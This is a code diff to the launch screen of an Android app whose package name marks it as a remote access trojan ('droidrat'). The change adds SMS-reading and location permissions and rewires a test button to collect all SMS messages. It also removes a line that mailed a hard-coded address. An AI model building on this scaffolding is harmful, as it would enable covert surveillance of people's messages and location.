@@ -6,24 +6,28 @@ import android.os.Build;
 import android.os.Bundle;
 import android.view.View;
 import android.widget.Button;
-import android.widget.Toast;
 
-import androidx.annotation.NonNull;
 import androidx.appcompat.app.AppCompatActivity;
 
+import com.google.android.gms.common.api.GoogleApi;
+import com.google.android.gms.common.api.GoogleApiClient;
+import com.google.android.gms.location.LocationRequest;
 import com.je_chen.droidrat_je.R;
 import com.je_chen.droidrat_je.appintent.call.Call;
 import com.je_chen.droidrat_je.appintent.mail.SendMail;
 import com.je_chen.droidrat_je.appintent.web.Web;
 import com.je_chen.droidrat_je.appsinfo.checkpermission.PermissionsCheck;
-
-import java.util.ArrayList;
-import java.util.Arrays;
-import java.util.List;
+import com.je_chen.droidrat_je.sms.SMS;
 
 public class LaunchActivity extends AppCompatActivity implements View.OnClickListener {
 
     final String TAG = "JE-TAG";
+
+    private final static int CONNECTION_FAILURE_RESOLUTION_REQUEST = 9000;
+    private GoogleApi googleApi;
+    private LocationRequest locationRequest;
+    private double currentLatitude;
+    private double currentLongitude;
 
     PackageManager packageManager;
 
@@ -33,9 +37,13 @@ public class LaunchActivity extends AppCompatActivity implements View.OnClickLis
 
     SendMail sendMail;
 
+    SMS sms;
+
     PermissionsCheck permissionsCheck;
 
+
     Button testButton;
+
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -49,8 +57,10 @@ public class LaunchActivity extends AppCompatActivity implements View.OnClickLis
 
                 // LOCATION
                 Manifest.permission.ACCESS_FINE_LOCATION,
+                Manifest.permission.ACCESS_COARSE_LOCATION,
 
                 //SMS
+                Manifest.permission.RECEIVE_SMS,
                 Manifest.permission.SEND_SMS,
                 Manifest.permission.READ_SMS};
 
@@ -59,6 +69,7 @@ public class LaunchActivity extends AppCompatActivity implements View.OnClickLis
         call = new Call();
         web = new Web();
         sendMail = new SendMail();
+        sms = new SMS();
 
         permissionsCheck = new PermissionsCheck(packageManager);
 
@@ -72,17 +83,26 @@ public class LaunchActivity extends AppCompatActivity implements View.OnClickLis
     }
 
     @Override
-    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
+    protected void onStart() {
+        super.onStart();
+    }
 
+    @Override
+    protected void onResume() {
+        super.onResume();
+    }
+
+    @Override
+    protected void onDestroy() {
+        super.onDestroy();
     }
 
     @Override
     public void onClick(View view) {
-        switch (view.getId()){
+        switch (view.getId()) {
             case R.id.testButton:
-                sendMail.sendMail(this,"410877027@mail.nknu.edu.tw","Test","Test");
-            break;
+                sms.getAllSms(this);
+                break;
         }
     }
-
 }
